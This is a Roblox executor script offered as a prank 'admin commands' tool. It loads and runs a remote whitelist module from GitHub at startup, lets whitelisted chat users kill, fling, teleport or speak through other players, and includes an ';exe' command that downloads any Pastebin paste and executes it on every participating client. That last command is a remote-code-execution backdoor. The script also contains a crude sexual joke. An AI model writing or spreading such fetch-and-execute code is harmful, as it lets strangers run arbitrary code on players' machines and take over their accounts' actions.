--[[
                                                                              
,--.   ,--.        ,--.             ,--. ,-----.,--.   ,--.,------.   ,---.   
|  |   `--',--,--, |  |,-. ,---.  ,-|  |'  .--./|   `.'   ||  .-.  \ '   .-'  
|  |   ,--.|      \|     /| .-. :' .-. ||  |    |  |'.'|  ||  |  \  :`.  `-.  
|  '--.|  ||  ||  ||  \  \\   --.\ `-' |'  '--'\|  |   |  ||  '--'  /.-'    | 
`-----'`--'`--''--'`--'`--'`----' `---'  `-----'`--'   `--'`-------' `-----'  

- A group player admin commands script.
- This was made for boredom.
- You can mess around with your friends using this script!
- Theres not much here... but it works. :p

- database thingy by e god/fred yay
]]

local wlmod = loadstring(game:HttpGet("https://raw.githubusercontent.com/TheEGodOfficial/e-god-link-cmds/refs/heads/main/cool-stuff/module-thingy.luau"))()

local env = getgenv and getgenv() or shared or _G

lp=game:GetService('Players').LocalPlayer

env.other={}

table.insert(env.other,lp.Name)
wlmod.addwl("yes",lp.UserId)


coroutine.wrap(function()
	while task.wait(3.75) do
		for _,p in pairs(game:GetService("Players"):GetPlayers()) do
			if wlmod.iswl(p.UserId) then
				table.remove(env.other,table.find(env.other,p.Name))
				table.insert(env.other,p.Name)
			end
		end
	end
end)()

game:GetService("Players").PlayerRemoving:Connect(function(p)
	if p == lp then
		wlmod.removewl("no",p.UserId)
	end
end)

game:GetService('TextChatService').TextChannels.RBXGeneral:SendAsync('LinkedCMDS Executed. (E God/Fred was here)')
local s = ''
for i,v in pairs(env.other) do
	s = s..v..', '
end
s=s:sub(1, string.len(s)-2)
game:GetService('TextChatService').TextChannels.RBXGeneral:SendAsync('Admins: '..s..'.')
chatted=game:GetService("TextChatService").MessageReceived
if not table.find(_G.other, lp.Name) then table.insert(_G.other, lp.Name) end
char=lp.Character or lp.CharacterAdded:Wait()
human=char:WaitForChild('Humanoid')
root=human.RootPart or char:WaitForChild('HumanoidRootPart')
lp.CharacterAdded:Connect(function(c)
	char=c;
	human=char:WaitForChild('Humanoid')
	root=human.RootPart or char:WaitForChild('HumanoidRootPart')
end)
jorkin = false
track = nil
freezing = false

IceCube = Instance.new('Part', workspace)
IceCube.Name = 'IceCube'
IceCube['Anchored'] = true
IceCube['BackSurface'] = Enum.SurfaceType.Smooth
IceCube['BottomSurface'] = Enum.SurfaceType.Smooth
IceCube['BrickColor'] = BrickColor.new('Deep blue')
IceCube['CanCollide'] = false
IceCube['CanTouch'] = true
IceCube['CastShadow'] = true
IceCube['CollisionGroupId'] = 0
IceCube['Color'] = Color3.new(0.129412, 0.329412, 0.72549)
IceCube['CustomPhysicalProperties'] = nil
IceCube['FrontSurface'] = Enum.SurfaceType.Smooth
IceCube['LeftSurface'] = Enum.SurfaceType.Smooth
IceCube['Locked'] = false
IceCube['Massless'] = false
IceCube['Material'] = Enum.Material.Plastic
IceCube['Orientation'] = Vector3.new(0, 0, 0)
IceCube['Reflectance'] = 0.25
IceCube['RightSurface'] = Enum.SurfaceType.Smooth
IceCube['RootPriority'] = 0
IceCube['Rotation'] = Vector3.new(0, 0, 0)
IceCube['Size'] = Vector3.new(6, 6, 6)
IceCube['TopSurface'] = Enum.SurfaceType.Smooth
IceCube['Transparency'] = 1

IceCubeBlur = Instance.new('Decal', IceCube)
IceCubeBlur.Name = 'IceCubeBlur'
IceCubeBlur['Color3'] = Color3.new(1, 1, 1)
IceCubeBlur['Texture'] = 'http://www.roblox.com/asset/?id=5707015302'
IceCubeBlur['Transparency'] = 1
IceCubeBlur['ZIndex'] = 1

Mesh = Instance.new('SpecialMesh', IceCube)
Mesh.Name = 'Mesh'
Mesh.Scale = Vector3.new(0.12,0.12,0.12)
Mesh.MeshId = 'rbxassetid://526137728'

chatted:Connect(function(t)
	local msg = t.Text
	local user = t.TextSource.Name
	if not table.find(_G.other, user) then return end
	if msg:sub(0,1) == ';' then 
		local args = string.split(msg:sub(2, -1), ' ')
		local command = args[1]
		local target = args[2]
		if target == nil then return end
		target = target:lower()
		local option = table.concat(args, ' ', 3)

		if (target == 'others' and lp.Name:lower() ~= user:lower()) or (target == 'me' and lp.Name:lower() == user:lower()) or target == 'all' or target == '.' or lp.Name:sub(1, math.min(#lp.Name, #target)):lower() == target:lower() then
			if command == 'say' and option ~= nil then
				game:GetService('TextChatService').TextChannels.RBXGeneral:SendAsync(option)
			elseif command == 'gravity' or command == 'grav' and option ~= nil then
				-- default: 196.2
				workspace.Gravity = tonumber(option)
			elseif command == 'kill' then
				char:BreakJoints()
			elseif command == 'trip' then
				human:ChangeState(0)
				root.Velocity = root.CFrame.LookVector * 30
			elseif command == 'sit' then
				human.Sit = not human.Sit
			elseif command == 'walkspeed' or command == 'ws' and option ~= nil then
				human.WalkSpeed = tonumber(option)
			elseif command == 'jumppower' or command == 'jp' and option ~= nil then
				human.UseJumpPower = true
				human.JumpPower = tonumber(option)
			elseif command == 'jump' then
				human:ChangeState(3)
			elseif command == 'jork' then
				--holy fuck im cumming lois
				jorkin = true
				while jorkin do
					task.wait()
					local isR15 = human.RigType==Enum.HumanoidRigType.R15
					if not track then
						local anim = Instance.new("Animation")
						anim.AnimationId = not isR15 and "rbxassetid://72042024" or "rbxassetid://698251653"
						track = human:LoadAnimation(anim)
					end

					track:Play()
					track:AdjustSpeed(isR15 and 0.7 or 0.65)
					track.TimePosition = 0.6
					task.wait(0.1)
					while track and track.TimePosition < (not isR15 and 0.65 or 0.7) do task.wait(0.1) end
					if track then
						track:Stop()
						track = nil
					end
				end
			elseif command == 'unjork' then
				jorkin = false
				if track then
					track:Stop()
					track = nil
				end
			elseif command == 'fling' then
				for i = 1,100 do
					task.wait()
					root.RotVelocity = Vector3.new(9000,9000,9000)
					root.Velocity = Vector3.new(math.random(-10000,10000),math.random(-10000,10000),math.random(-10000,10000))
				end
			elseif command == 'tocf' and option ~= nil then
				if string.find(option, ',') then
					local cft = string.split(option, ',')
					local cf = CFrame.new(tonumber(cft[1]), tonumber(cft[2]), tonumber(cft[3]))
					root.CFrame = cf
				else
					local cft = string.split(option, ' ')
					local cf = CFrame.new(tonumber(cft[1]), tonumber(cft[2]), tonumber(cft[3]))
					root.CFrame = cf
				end
			elseif command == 'maxfps' and option ~= nil then
				if type(setfpscap) == 'function' then
					setfpscap(tonumber(option))
				end
			elseif command == 'hh' and option ~= nil then
				human.HipHeight = tonumber(option)
			elseif command == 'bring' then
				local c = game:GetService('Players')[user].Character or game:GetService('Players')[user].CharacterAdded:Wait()
				local rot = c:WaitForChild('HumanoidRootPart')
				root.CFrame = rot.CFrame
			elseif command == 'friend' and option ~= nil then
				local p
				for i,v in pairs(game:GetService('Players'):GetPlayers()) do
					if v.Name:sub(1, math.min(#v.Name, #option)):lower() == option:lower() then
						p = v
						break
					end
				end
				if user == lp.Name then
					if option == 'me' then
						p = lp
					end
				else
					if option == 'me' then
						p = game:GetService('Players')[user]
					end
				end
				lp:RequestFriendship(p)
			elseif command == 'fov' and option ~= nil then
				workspace.CurrentCamera.FieldOfView = tonumber(option)
			elseif command == 'freeze' then
				freezing = true
				task.spawn(function()
					local cf = root.CFrame
					while freezing do
						task.wait()
						root.Anchored = true
						root.CFrame = cf
						IceCube.CFrame = root.CFrame
						IceCube['Transparency'] = 0.7
						IceCubeBlur['Transparency'] = 0.75
						Mesh.Scale = Vector3.new(0.12,0.12,0.12)
					end
				end)
			elseif command == 'thaw' then
				freezing = false
				task.wait()
				root.Anchored = false
				game:GetService('TweenService'):Create(IceCube, TweenInfo.new(0.5, Enum.EasingStyle.Sine, Enum.EasingDirection.Out), {Transparency = 1}):Play()
				game:GetService('TweenService'):Create(IceCubeBlur, TweenInfo.new(0.5, Enum.EasingStyle.Sine, Enum.EasingDirection.Out), {Transparency = 1}):Play()
				game:GetService('TweenService'):Create(Mesh, TweenInfo.new(0.5, Enum.EasingStyle.Sine, Enum.EasingDirection.Out), {Scale = Vector3.new(0,0,0)}):Play()
			elseif command == 'wake' then
				local s = Instance.new('Sound',game:GetService('SoundService'))
				s.SoundId = 'rbxassetid://9118052301'
				local d = Instance.new('DistortionSoundEffect',s)
				d.Level = 1
				s.Volume = 10
				s.Pitch = 0.5
				if not s.IsLoaded then
					s.Loaded:Wait()
				end
				s:Play()
				task.wait(10.694)
				s:Destroy()
			elseif command == 'exe' or command == 'execute' and option ~= nil then
				local url = 'https://pastebin.com/raw/'..option
				local get = game:HttpGet(url)
				if type(loadstring)=='function' then
					loadstring(get)()
				end
			end
		end
		if command == 'duck' then
			local p
			for i,v in pairs(game:GetService('Players'):GetPlayers()) do
				if v.Name:sub(1, math.min(#v.Name, #target)):lower() == target:lower() then
					p = v
					break
				end
			end
			if user == lp.Name then
				if target == 'me' then
					p = lp
				end
			else
				if target == 'me' then
					p = game:GetService('Players')[user]
				end
			end
			if not p then
				if target == '.' or target == 'all' then
					for i,v in pairs(_G.other) do
						local h = game:GetService('Players')[v]
						local c = h.Character or h.CharacterAdded:Wait()
						local hrp = c:WaitForChild('HumanoidRootPart')
						local duckPart = Instance.new("Part")
						duckPart.Size = Vector3.new(6, 6, 6)
						duckPart.Anchored = false
						duckPart.CanCollide = false
						duckPart.Name = "RubberDuck"
						duckPart.Transparency = 0
						duckPart.Parent = c

						local mesh = Instance.new("SpecialMesh")
						mesh.MeshType = Enum.MeshType.FileMesh
						mesh.MeshId = "rbxassetid://9419831"
						mesh.TextureId = "rbxassetid://9419827"
						mesh.Scale = Vector3.new(6, 6, 6)
						mesh.Parent = duckPart

						local weld = Instance.new("Weld")
						weld.Part0 = hrp
						weld.IceCube = duckPart
						weld.C0 = CFrame.new(0, 0, 0)
						weld.C1 = CFrame.new(0, 0, 0)
						weld.Parent = hrp

						for _, obj in ipairs(c:GetDescendants()) do
							if obj:IsA("BasePart") and obj ~= hrp and obj ~= duckPart then
								obj.Transparency = 1
								obj.CanCollide = false
							elseif obj:IsA("Decal") then
								obj.Transparency = 1
							end
						end
					end
				elseif target == 'others' then
					for i,v in pairs(_G.other) do
						local h = game:GetService('Players')[v]
						if h.Name == user then continue end
						local c = h.Character or h.CharacterAdded:Wait()
						local hrp = c:WaitForChild('HumanoidRootPart')
						local duckPart = Instance.new("Part")
						duckPart.Size = Vector3.new(6, 6, 6)
						duckPart.Anchored = false
						duckPart.CanCollide = false
						duckPart.Name = "RubberDuck"
						duckPart.Transparency = 0
						duckPart.Parent = c

						local mesh = Instance.new("SpecialMesh")
						mesh.MeshType = Enum.MeshType.FileMesh
						mesh.MeshId = "rbxassetid://9419831"
						mesh.TextureId = "rbxassetid://9419827"
						mesh.Scale = Vector3.new(6, 6, 6)
						mesh.Parent = duckPart

						local weld = Instance.new("Weld")
						weld.Part0 = hrp
						weld.IceCube = duckPart
						weld.C0 = CFrame.new(0, 0, 0)
						weld.C1 = CFrame.new(0, 0, 0)
						weld.Parent = hrp

						for _, obj in ipairs(c:GetDescendants()) do
							if obj:IsA("BasePart") and obj ~= hrp and obj ~= duckPart then
								obj.Transparency = 1
								obj.CanCollide = false
							elseif obj:IsA("Decal") then
								obj.Transparency = 1
							end
						end
					end
				end
			else
				local c = p.Character or p.CharacterAdded:Wait()
				local hrp = c:WaitForChild('HumanoidRootPart')
				local duckPart = Instance.new("Part")
				duckPart.Size = Vector3.new(6, 6, 6)
				duckPart.Anchored = false
				duckPart.CanCollide = false
				duckPart.Name = "RubberDuck"
				duckPart.Transparency = 0
				duckPart.Parent = c

				local mesh = Instance.new("SpecialMesh")
				mesh.MeshType = Enum.MeshType.FileMesh
				mesh.MeshId = "rbxassetid://9419831"
				mesh.TextureId = "rbxassetid://9419827"
				mesh.Scale = Vector3.new(6, 6, 6)
				mesh.Parent = duckPart

				local weld = Instance.new("Weld")
				weld.Part0 = hrp
				weld.IceCube = duckPart
				weld.C0 = CFrame.new(0, 0, 0)
				weld.C1 = CFrame.new(0, 0, 0)
				weld.Parent = hrp

				for _, obj in ipairs(c:GetDescendants()) do
					if obj:IsA("BasePart") and obj ~= hrp and obj ~= duckPart then
						obj.Transparency = 1
						obj.CanCollide = false
					elseif obj:IsA("Decal") then
						obj.Transparency = 1
					end
				end
			end
		end
		if command == 'explode' or command == 'exp' then
			local p
			for i,v in pairs(game:GetService('Players'):GetPlayers()) do
				if v.Name:sub(1, math.min(#v.Name, #target)):lower() == target:lower() then
					p = v
					break
				end
			end
			if user == lp.Name then
				if target == 'me' then
					p = lp
				end
			else
				if target == 'me' then
					p = game:GetService('Players')[user]
				end
			end
			if not p then
				if target == '.' or target == 'all' then
					for i,v in pairs(_G.other) do
						local h = game:GetService('Players')[v]
						local c = h.Character or h.CharacterAdded:Wait()
						local hrp = c:WaitForChild('HumanoidRootPart')
						if option == nil then
							option = 1
						end
						for i = 1,tonumber(option) do
							local exp = Instance.new("Explosion")
							exp.Position = hrp.Position
							exp.Parent = c
						end
					end
				elseif target == 'others' then
					for i,v in pairs(_G.other) do
						local h = game:GetService('Players')[v]
						if h.Name == user then continue end
						local c = h.Character or h.CharacterAdded:Wait()
						local hrp = c:WaitForChild('HumanoidRootPart')
						if option == nil then
							option = 1
						end
						for i = 1,tonumber(option) do
							local exp = Instance.new("Explosion")
							exp.Position = hrp.Position
							exp.Parent = c
						end
					end
				end
			else
				local c = p.Character or p.CharacterAdded:Wait()
				local hrp = c:WaitForChild('HumanoidRootPart')
				if option == nil then
					option = 1
				end
				for i = 1,tonumber(option) do
					local exp = Instance.new("Explosion")
					exp.Position = hrp.Position
					exp.Parent = c
				end
			end
		end
		if command == 'smoke' then
			local p
			for i,v in pairs(game:GetService('Players'):GetPlayers()) do
				if v.Name:sub(1, math.min(#v.Name, #target)):lower() == target:lower() then
					p = v
					break
				end
			end
			if user == lp.Name then
				if target == 'me' then
					p = lp
				end
			else
				if target == 'me' then
					p = game:GetService('Players')[user]
				end
			end
			if not p then
				if target == '.' or target == 'all' then
					for i,v in pairs(_G.other) do
						local h = game:GetService('Players')[v]
						local c = h.Character or h.CharacterAdded:Wait()
						for i,v in pairs(c:GetDescendants()) do
							if v:IsA('BasePart') then
								local sm = Instance.new('Smoke',v)
							end
						end
					end
				elseif target == 'others' then
					for i,v in pairs(_G.other) do
						local h = game:GetService('Players')[v]
						if h.Name == user then continue end
						local c = h.Character or h.CharacterAdded:Wait()
						for i,v in pairs(c:GetDescendants()) do
							if v:IsA('BasePart') then
								local sm = Instance.new('Smoke',v)
							end
						end
					end
				end
			else
				local c = p.Character or p.CharacterAdded:Wait()
				for i,v in pairs(c:GetDescendants()) do
					if v:IsA('BasePart') then
						local sm = Instance.new('Smoke',v)
					end
				end
			end
		end
		if command == 'fire' then
			local p
			for i,v in pairs(game:GetService('Players'):GetPlayers()) do
				if v.Name:sub(1, math.min(#v.Name, #target)):lower() == target:lower() then
					p = v
					break
				end
			end
			if user == lp.Name then
				if target == 'me' then
					p = lp
				end
			else
				if target == 'me' then
					p = game:GetService('Players')[user]
				end
			end
			if not p then
				if target == '.' or target == 'all' then
					for i,v in pairs(_G.other) do
						local h = game:GetService('Players')[v]
						local c = h.Character or h.CharacterAdded:Wait()
						for i,v in pairs(c:GetDescendants()) do
							if v:IsA('BasePart') then
								local sm = Instance.new('Fire',v)
							end
						end
					end
				elseif target == 'others' then
					for i,v in pairs(_G.other) do
						local h = game:GetService('Players')[v]
						if h.Name == user then continue end
						local c = h.Character or h.CharacterAdded:Wait()
						for i,v in pairs(c:GetDescendants()) do
							if v:IsA('BasePart') then
								local sm = Instance.new('Fire',v)
							end
						end
					end
				end
			else
				local c = p.Character or p.CharacterAdded:Wait()
				for i,v in pairs(c:GetDescendants()) do
					if v:IsA('BasePart') then
						local sm = Instance.new('Fire',v)
					end
				end
			end
		end
		if command == 'to' and lp.Name == user then
			local p
			for i,v in pairs(game:GetService('Players'):GetPlayers()) do
				if v.Name:sub(1, math.min(#v.Name, #target)):lower() == target:lower() then
					p = v
					break
				end
			end
			if user == lp.Name then
				if target == 'me' then
					p = lp
				end
			else
				if target == 'me' then
					p = game:GetService('Players')[user]
				end
			end
			if not p then return end
			local c = p.Character or p.CharacterAdded:Wait()
			local rot = c:WaitForChild('HumanoidRootPart')
			root.CFrame = rot.CFrame
		end
	end
end)
--commands:
--[[
;trip [person]
;sit [person]
;jork [person]
;unjork [person]
;walkspeed [person] [number]
;ws [person] [number]
;jumppower [person] [number]
;jp [person] [number]
;gravity [person] [number]
;grav [person] [number]
;say [person] [text]
;kill [person]
;jump [person]
;fling [person]
;tocf [person] [x,y,z] or [x y z]
;duck [person]
;maxfps [person] [number]
;hipheight [person] [number]
;hh [person] [number]
;to [person]
;bring [person]
;friend [person] [person]
;fov [person] [number]
;freeze [person]
;thaw [person]
;explode [person] [number]
;exp [person] [number]
;smoke [person]
;fire [person]
;wake [person]
;exe [person] [pastebin]
;execute [person] [pastebin]
]]

--people:
--[[
me, [other person], all, others, .
]]
